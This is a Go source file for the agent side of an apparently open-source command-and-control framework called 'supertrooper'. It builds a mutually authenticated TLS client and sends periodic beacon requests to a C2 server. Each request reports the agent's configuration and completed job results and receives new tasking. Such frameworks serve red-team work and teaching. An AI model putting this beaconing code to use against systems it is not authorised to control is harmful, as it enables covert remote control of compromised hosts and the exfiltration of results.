package agent

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/joe-broder15/supertrooper/internal/common"
)

// initialize an https client with mtls using the provided CA cert, agent cert, and agent key
func NewHttpsClient(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) (*http.Client, error) {

	// Load the agent's certificate and key for client identity.
	agentCert, err := tls.X509KeyPair(agentCertPEM, agentKeyPEM)
	if err != nil {
		log.Fatalf("agent: error loading key pair: %v", err)
	}

	// Create a CA pool with the provided CA certificate to verify the server.
	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCertPEM); !ok {
		return nil, fmt.Errorf("agent: failed to append CA certificate")
	}

	// create a tls config with the above certificates
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{agentCert},
		RootCAs:      caCertPool,
		MinVersion:   tls.VersionTLS12,
	}

	// Create the https transport with the TLS config
	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
	}

	// create and return the client
	return &http.Client{Transport: transport}, nil
}

// send a beacon to the c2 server and get a beacon response
func SendBeaconReq(httpClient *http.Client, state *AgentState) (common.BeaconRsp, error) {

	// create the request
	beaconReq := common.BeaconReq{
		AgentConfig:        state.Config,
		JobResponses:       state.CompletedJobs,
		AgentHostInfo:      common.AgentHostInfo{},
		NextBeaconExpected: int(time.Now().Unix()) + state.Config.BeaconInterval,
	}

	// encode the request as JSON
	beaconRequestJSON, err := json.Marshal(beaconReq)
	if err != nil {
		return common.BeaconRsp{}, fmt.Errorf("failed to encode request JSON: %v", err)
	}

	// Create the request
	req, err := http.NewRequest("POST", state.Config.ServerAddr, bytes.NewBuffer(beaconRequestJSON))
	if err != nil {
		return common.BeaconRsp{}, fmt.Errorf("failed to create request object: %v", err)
	}

	// set request headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")

	// send the post request to the c2 server
	rsp, err := httpClient.Do(req)
	if err != nil {
		return common.BeaconRsp{}, fmt.Errorf("failed to send post request: %v", err)
	}
	defer rsp.Body.Close()

	// check the status code
	if rsp.StatusCode != http.StatusOK {
		return common.BeaconRsp{}, fmt.Errorf("got status: %v", rsp.StatusCode)
	}

	// decode the response to json
	var beaconRsp common.BeaconRsp
	if err := json.NewDecoder(rsp.Body).Decode(&beaconRsp); err != nil {
		log.Fatalf("Failed to decode response: %v", err)
	}

	return beaconRsp, nil

}
